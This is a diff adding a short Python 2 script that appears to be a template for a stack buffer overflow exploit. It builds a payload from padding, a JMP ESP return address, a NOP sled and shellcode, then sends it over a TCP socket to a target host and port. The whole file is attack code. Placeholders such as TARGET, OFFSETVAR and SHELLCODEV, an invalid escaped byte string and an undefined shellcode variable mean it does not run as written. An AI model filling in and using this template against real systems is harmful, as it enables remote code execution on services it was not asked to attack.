@@ -1,0 +1,16 @@
+import socket
+rhost = 'TARGET'
+rport = 'PORT'
+offset = 'OFFSETVAR'
+jmpesp = '\xQWE\xERT\xTYU\xUIO'
+nopsled = "\x90" *20
+SHELLCODEV
+
+payload = "A"*offset + jmpesp + nopsled + shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((rhost,rport))
+print "[!] Connected"
+s.send(payload)
+print "[!] Payload Sent"
+s.close
